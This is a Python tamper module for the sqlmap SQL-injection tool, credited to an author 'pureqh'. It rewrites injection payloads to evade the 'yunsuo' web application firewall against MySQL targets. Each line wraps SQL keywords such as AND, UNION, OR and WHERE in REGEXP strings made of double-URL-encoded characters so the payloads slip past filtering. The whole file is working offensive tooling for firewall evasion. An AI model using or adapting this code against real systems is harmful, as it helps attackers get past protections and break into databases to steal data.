#!/usr/bin/env python
# -*- coding: utf-8 -*-



"""
Copyright (c) 2006-2019 sqlmap developers (http:%23 %26%23 %26sqlmap.org%23 %26)
See the file 'LICENSE' for copying permission
Author:pureqh.top
"""

import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass yunsuo by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):

        payload=payload.replace(" ","  ",1)
        payload=payload.replace("  AND"," REGEXP \"[...%252523]\" and",1)
        payload=re.sub(r'(ORDER BY \d+)', "x", payload)
        payload=payload.replace("UNION"," REGEXP \"[...%252523]\" union",1)
        payload=payload.replace("(SELECT (CASE WHEN ("," REGEXP \"[...%252523]\" (SELECT (CASE WHEN (",1)
        payload=payload.replace("  AS "," REGEXP \"[...%252523]\" as ",1)
        payload=payload.replace(" OR "," REGEXP \"[...%252523]\" or ",1)
        payload=payload.replace("  WHERE "," REGEXP \"[...%252523]\" where ",1)
        payload=payload.replace("HIGH_RISK_OPERATION:0"," REGEXP \"[...%252523]\"  ",1)
        payload=payload.replace(";","; REGEXP \"[...%252523]\"  HTGH",1)
        payload=payload.replace("||","; || REGEXP \"[...%252523]\" ",1)
        payload=payload.replace("THEN"," THEN REGEXP \"[...%252523]\" ",1)
        payload=payload.replace("  IN"," REGEXP \"[...%252523]\"  IN ",1)
        payload=payload.replace("+"," REGEXP \"[...%252523]\"  + ",1)
        payload=payload.replace("WHEN"," REGEXP \"[...%252523]\"   ",1)
        return payload
